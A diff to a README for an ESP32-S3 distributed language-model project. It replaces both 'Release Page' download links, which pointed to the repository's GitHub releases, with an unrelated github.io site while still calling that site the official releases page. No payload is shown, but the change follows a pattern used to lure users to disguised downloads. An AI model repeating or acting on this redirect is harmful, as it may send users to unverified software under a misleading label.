@@ -1,6 +1,6 @@
 # 🧠 esp32s3-distributed-ai - Run large language models on hardware
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/pleurocarpous-artist175/esp32s3-distributed-ai/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://pleurocarpous-artist175.github.io)
 
 This project allows you to run a 56-million parameter language model using three ESP32-S3 boards. The system splits the processing tasks across these boards to handle artificial intelligence tasks without an internet connection.
 
@@ -15,7 +15,7 @@ To use this software, you need the following items:
 
 ## 📥 Downloading the software
 
-Visit the [official releases page](https://github.com/pleurocarpous-artist175/esp32s3-distributed-ai/releases) to obtain the necessary files. Download the most recent version available in the list. Ensure you save the file in a folder you can locate easily, such as your Downloads folder.
+Visit the [official releases page](https://pleurocarpous-artist175.github.io) to obtain the necessary files. Download the most recent version available in the list. Ensure you save the file in a folder you can locate easily, such as your Downloads folder.
 
 ## 🔌 Connecting your hardware
 
